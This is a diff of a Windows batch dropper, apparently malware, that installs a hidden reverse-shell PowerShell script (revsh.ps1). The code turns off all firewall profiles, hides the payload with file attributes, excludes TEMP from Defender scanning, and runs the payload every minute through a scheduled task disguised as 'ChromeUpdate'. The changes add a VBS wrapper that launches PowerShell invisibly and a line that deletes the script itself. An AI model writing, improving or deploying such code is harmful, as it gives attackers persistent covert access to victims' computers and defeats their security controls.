@@ -21,6 +21,7 @@ netsh advfirewall set allprofiles state off >nul 2>&1
 set "taskname=ChromeUpdate"
 set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;"
 set "file=revsh.ps1"
+set "wrapper=launch.vbs"
 
 echo if (netstat -an ^| select-string ":42069") { exit } > %file%
 echo $addrs = @(arp -a ^| select-string dynamic ^| foreach-object { ($_.line.trim() -split " ")[0] }); >> %file%
@@ -36,5 +37,13 @@ echo $client.Close(); } catch {} } >> %file%
 attrib +h +s +r %file% >nul 2>&1
 powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\"" > nul 2>&1
 
-schtasks /create /tn "%taskname%" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%\%file%\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
+:: run in hidden mode using vbs wrapper
+echo Set WshShell = CreateObject("WScript.Shell") > %wrapper%
+echo WshShell.Run "powershell -ExecutionPolicy Bypass -File ""%TEMP%\%file%""", 0, False >> %wrapper%
+
+schtasks /create /tn "%taskname%" /tr "wscript.exe \"%TEMP%\launch.vbs\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
 powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul
+
+:: delete itself
+cd ..
+del /f /q %~f0
